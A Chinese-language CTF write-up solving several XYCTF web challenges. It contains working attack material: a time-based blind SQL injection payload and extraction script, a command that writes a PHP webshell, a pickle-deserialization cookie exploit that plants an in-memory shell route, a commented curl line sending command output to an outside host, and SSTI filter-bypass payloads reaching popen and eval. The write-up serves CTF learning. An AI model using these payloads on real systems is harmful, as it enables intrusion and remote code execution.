# XYCTF-web个人wp-先知社区

> **来源**: https://xz.aliyun.com/news/17696  
> **文章ID**: 17696

---

# ez\_puzzle

简单玩一玩，可以发现打通后会弹一个窗口，我们搜游一下alert可以发现只有两个alert代码  
![image.png](images/img_17696_000.png)

![image.png](images/img_17696_001.png)

运行第二个alert可以发现其是失败后的弹窗那么第一个应该就是flag的了  
ctrl+s将源码扒下来，改一下alert的判断条件  
![image.png](images/img_17696_002.png)

把小于号改成大于，再打通一次即可。  
![image.png](images/img_17696_003.png)

# ezsql

在登陆处发现sql注入，简单验证一些发现其过滤了空格，逗号之类的，使用括号来过滤空格，而因为无法使用逗号，所以直接使用盲注  
payload

```
admin'or(sleep(ascii(mid((select database())from(1)for(1)))>108))#
```

![image.png](images/img_17696_004.png)

当条件成立会时延1s写脚本直接爆  
![image.png](images/img_17696_005.png)

![image.png](images/img_17696_006.png)

爆出double\_check为  
dtfrtkcc0czkoua9S  
账号密码为  
yudeyoushang  
zhonghengyisheng

```
import requests
import time
import json

url = "http://eci-2zefzg22buvmrl7v0z2n.cloudeci1.ichunqiu.com:80"
flag = ""
for i in range(1, 18):
    low = 32
    high = 128
    mid = (low + high) >> 1
    while low < high:
        #payload = "admin'or(sleep(ascii(mid(database()from({})for(1)))>{}))#".format(i, mid)
        #payload="admin'or(sleep(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))from({})for(1)))>{}))#".format(i, mid)
        #payload="admin'or(sleep(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database()))from({})for(1)))>{}))#".format(i, mid)
        payload="admin'or(sleep(ascii(mid((select(password)from(user))from({})for(1)))>{}))#".format(i, mid)
        
        start_time = time.time()
        r = requests.post(url, data=datas,verify=False)
        #print(r.text)
        end_time = time.time()
        #print(end_time - start_time)
        if end_time - start_time > 1:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 127):
        break
    flag += chr(mid)
    print(flag)

print(flag)

```

登陆后会要求进行双重验证，我们都爆出来了  
登陆后是一个无回显的命令执行，其过滤了空格我们使用`$IFS$9`来进行代替还有一些关键词绕过我们使用反斜杠来绕过，然后直接写马

```
command=ec\ho$IFS$9'<?=eval($_POST[123])?>'>/var/www/html/sell.ph\p
```

![image.png](images/img_17696_007.png)

# Signin

```
from bottle import Bottle, request, response, redirect, static_file, run, route
secret="asdw"

app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=5000, debug=False)
```

![image.png](images/img_17696_008.png)

我们看一些get\_cookie的源码可以发现其是使用pickle.loads来对数据进行反序列化的，而ser\_cookie就使用pickle.dumps来序列化的，那么只要我们得到key，加密一个恶意的pickle序列化内容就可以进行rce了

/download存在一个文件下载，我们使用./.././../这种方法可以实现目录穿透，读取key  
然后拿到key来进行cookie的生成  
![image.png](images/img_17696_009.png)

直接打内存马

```
from bottle import route, run,response
import os


sekai = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class exp():
    def __reduce__(self):
        # cmd = "curl http://x.x.x.x:7777/123?res=`ls -la /|base64 -w 0`"
        cmd = "route("/shell","GET",lambda :__import__('os').popen(request.params.get('lalala')).read())"
        return (exec, (cmd,))


@route("/sign")
def index():
    try:
        #session = {"name": "admin"}
        session = exp()
        response.set_cookie("name", session, secret=sekai)
        return "success"
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=5003,debug=True)
```

![image.png](images/img_17696_010.png)

# Now you see me 1

```
# YOU FOUND ME ;)
# -*- encoding: utf-8 -*-
'''
@File    :   src.py
@Time    :   2025/03/29 01:10:37
@Author  :   LamentXU
'''
import flask
import sys
enable_hook =  False
counter = 0
def audit_checker(event,args):
    global counter
    if enable_hook:
        if event in ["exec", "compile"]:
            counter += 1
            if counter > 4:
                raise RuntimeError(event)

lock_within = [
    "debug", "form", "args", "values",
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application",
    'data', 'url' ,'\'', '"',
    "getattr", "_",
    "[", "]", "\", "/","self",
    "lipsum", "cycler", "joiner", "namespace",
    "init", "join", "decode",
    "batch", "first", "last" ,
    " ","dict","list","g.",
    "os", "subprocess",
    "g|a", "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\u", "pop", "referer",
    "The closer you see, the lesser you find."]
        # I hate all these.
app = flask.Flask(__name__)
@app.route('/')
def index():
    return 'try /H3dden_route'
@app.route('/H3dden_route')
def r3al_ins1de_th0ught():
    global enable_hook, counter
    name = flask.request.args.get('My_ins1de_w0r1d')
    if name:
        try:
            if name.startswith("Follow-your-heart-"):
                for i in lock_within:
                    if i in name:
                        print(i)
                        return 'NOPE.'
                enable_hook = True
                a = flask.render_template_string('{#'+f'{name}'+'#}')
                enable_hook = False
                counter = 0
                return a
            else:
                return 'My inside world is always hidden.'
        except RuntimeError as e:
            counter = 0
            return 'NO.'
        except Exception as e:
            return 'Error'
    else:
        return 'Welcome to Hidden_route!'

if __name__ == '__main__':
    import os
    try:
        import _posixsubprocess
        del _posixsubprocess.fork_exec
    except:
        pass
    import subprocess
    del os.popen
    del os.system
    del subprocess.Popen
    del subprocess.call
    del subprocess.run
    del subprocess.check_output
    del subprocess.getoutput
    del subprocess.check_call
    del subprocess.getstatusoutput
    del subprocess.PIPE
    del subprocess.STDOUT
    del subprocess.CalledProcessError
    del subprocess.TimeoutExpired
    del subprocess.SubprocessError
    sys.addaudithook(audit_checker)
    app.run(debug=False, host='0.0.0.0', port=5000)

```

首先一眼可以看出其为ssti，使用`#}{#`来闭合`{##}`,使用`{%%}`来绕过`{{}}`,而我们看黑名单并没有直接禁止request，那么我们简单来跑一下黑名单没有禁的request类

```
import flask

def filter_allowed_attributes(attributes, lock_within):
    """
    过滤属性列表，返回不包含任何黑名单字符串的属性
    :param attributes: 待过滤的属性列表
    :param lock_within: 黑名单列表
    :return: 允许使用的安全属性列表
    """
    allowed = []
    for attr in attributes:
        if not any(banned in attr for banned in lock_within):
            allowed.append(attr)
    return allowed

# 黑名单定义
lock_within = [
    "debug", "form", "args", "values",
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application",
    'data', 'url', '\'', '"',
    "getattr",
    "[", "]", "\", "/", "self",
    "lipsum", "cycler", "joiner", "namespace",
    "init", "join", "decode",
    "batch", "first", "last",
    " ", "dict", "list", "g.",
    "os", "subprocess",
    "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\u", "pop","_",
                                                   "Isn't that enough? Isn't that enough."]

# 示例：从Flask的request对象获取属性列表（实际使用时替换为真实属性列表）
request_attributes = dir(flask.Request)  # 这里需要替换为实际的request对象

# 过滤并打印安全属性
safe_attributes = filter_allowed_attributes(request_attributes, lock_within)
print("允许使用的安全属性：")
for attr in safe_attributes:
    print(attr)

```

可以发现其可以使用

```
authorization
blueprint
blueprints
date
endpoint
mimetype
origin
pragma
range
referrer
```

而其中

```
authorization
referrer
pragma
origin
mimetype
```

是我们完全可控的，那么我们就可以利用这5个请求头来进行绕过

```
GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7D{%print(a|attr(request.authorization.username)|attr(request.pragma|attr(request.authorization.password)(0))|attr(request.authorization.password)(request.origin)(request.mimetype))%}%7B%23  HTTP/1.1
Host: eci-2ze7jndrdiiwbfpam9jh.cloudeci1.ichunqiu.com:8080
Origin: eval
authorization: Basic X19pbml0X186X19nZXRpdGVtX18=
Content-Type: ''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']("dd if=/flag_h3r3 bs=1 skip=10000000 count=20000000 2>/dev/null|base64").read()
Pragma: __builtins__
Cache-Control: __getitem__
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: chkphone=123'; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1741245060; ci_session=ec1eef2fb931443ccbc7ef0abebb73adeb48816c
Connection: close
```

而删对os.system这种的删除我们直接使用最早学ssti的继承链即可绕过`''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']("dd if=/flag_h3r3 bs=1 skip=10000000 count=20000000 2>/dev/null|base64").read()`

# Now you see me 2

这题和上一题的区别是禁了更多的request下的类，再我的仔细观察下发现range没有被禁  
而range是获取Range头的内容，但是Range头需要有固定格式xxx=1-100象这样的格式。而我们可以使用jinja2的String和random过滤器来获取其随机一个字符，从而来获取我们想要的字符。我们只要获取到args就可以使用attr来获取request.args这个类，然后使用request.args来绕过waf即可

这里我使用config来作为中间变量来将获取到的字符之类的塞到config里，但是我们无法使用g.xxx，所以我们使用`{%set%0Aa=config%}`来先进行赋值（换行符来代替空格）将config赋值给a然后修改a即可

```
GET /H3dden_route?spell=fly-%23%7D{%set%0Aa=config%}{%set%0Ab=(a.update(a=(request.range|string|random)))%} HTTP/1.1
Host: 8.147.132.32:33177
Range: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=1-
```

使用上面的poc来获取a，同理得到r，g，s  
然后使用

```

{%set%0Aa=config%}{%set%0Ab=(a.update(ree=(request|attr(a.re))))%}{%set%0Ab=(a.update(g=(request.range|string|random)))%}{%print(a.ree.X2)%}%7B%23&X2=adws
```

来获取request.args然后就简单了

```
GET /H3dden_route?spell=fly-%23%7D{%set%0Aa=config%}{%set%0Ab=(a.update(ree=(request|attr(a.re))))%}{%print(a|attr(a.ree.X1)|attr(a.ree.X2)|attr(a.ree.X3)|attr(a.ree.X4)(a.ree.X5)|attr(a.ree.X4)(a.ree.X6)(a.ree.X7))%}%7B%23&X1=__class__&X2=__init__&X3=__globals__&X4=__getitem__&X5=__builtins__&X6=exec&X7=a=eval("''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('').read()");setattr(__import__('sys').modules['werkzeug'].serving.WSGIRequestHandler,"server_version",str(a)
```

因为不回显而且好像检测了路由添加，所以使用请求头回显。

# 出题人已疯

```
@bottle.route('/attack')
def attack():
    payload = bottle.request.query.get('payload')
    if payload and len(payload) < 25 and 'open' not in payload and '\' not in payload:
        return bottle.template('hello '+payload)
    else:
        bottle.abort(400, 'Invalid payload')
```

看眼源码可以发现其是ssti但是限制了长度，且禁了open等

一开始我是想到使用rebase或者include这两个模板函数来文件读取，但是这两个函数课读取的目录是被官方写死的，怎么绕能不能绕，我懒得调。所以就想能不能有一个中间变量来进行写入从而绕过长度限制

于是我想到了`__builtins__`,在flask的ssti中我们使用`{{}}`是无法对`__builtins__`进行赋值的但是因为这是bottle框架我们可以使用%来执行python命令。  
所以我们可以使用如下来进行赋值

```
attack?payload=%0A%__builtins__['x']='op'
attack?payload=%0A%__builtins__['y']='en'
```

因为bottle框架模板的环境就是`__builtins__`所以我们赋值的xy可以直接访问到如下  
XYCTF/IMG\_20250407-091109927.png)那么我们就可以用如下来赋值出open

```
attack?payload=%0A%__builtins__['e']=eval
attack?payload=%0A%__builtins__['O']=e(o)
attack?payload={{O('/flag').read()}}
```

XYCTF/IMG\_20250407-092039783.png)

如果想的话也可以慢慢拼出rce

#
